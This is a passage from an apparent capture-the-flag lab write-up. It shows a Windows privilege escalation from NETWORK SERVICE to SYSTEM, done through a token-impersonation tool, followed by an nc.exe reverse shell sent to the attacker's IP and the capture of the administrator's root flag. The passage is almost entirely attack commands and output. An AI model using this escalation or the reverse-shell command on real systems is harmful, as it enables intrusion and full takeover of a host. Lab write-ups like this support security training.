[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\dd11d0d5-7a12-4a55-8458-33f55628fd7f\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00008c02-0b44-ffff-5b29-549f8c489300
[*] DCOM obj OXID: 0xe4815f872bf235d1
[*] DCOM obj OID: 0x8c97048cbe2ef41b
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 872 Token:0x620  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 612
nt authority\system

PS C:\Users\Public\Documents> .\god.exe -cmd "cmd /c C:\Users\Public\Documents\nc.exe -e cmd.exe 10.10.16.46 4445"
.\god.exe -cmd "cmd /c C:\Users\Public\Documents\nc.exe -e cmd.exe 10.10.16.46 4445"
[*] CombaseModule: 0x140736394690560
[*] DispatchTable: 0x140736396996720
[*] UseProtseqFunction: 0x140736396372896
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\fa13c0f6-6766-4f7e-b8bf-10fced0ea48e\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00004402-0784-ffff-d7e3-b5e0e8b5a1d1
[*] DCOM obj OXID: 0x6549dd7906d4522b
[*] DCOM obj OID: 0xf3c552a274304230
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 872 Token:0x620  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 692

```

Catch the shell:

```shell
$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.16.46] from (UNKNOWN) [10.10.11.234] 50146
Microsoft Windows [Version 10.0.17763.4840]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public\Documents>whoami
whoami
nt authority\system

C:\Users\Public\Documents>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 82EF-5600

 Directory of C:\Users\Administrator\Desktop

09/19/2023  07:20 AM    <DIR>          .
09/19/2023  07:20 AM    <DIR>          ..
12/08/2023  12:49 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,651,747,328 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
38d91bd3b707efdbd2e1f20718f7c4bd

C:\Users\Administrator\Desktop>
```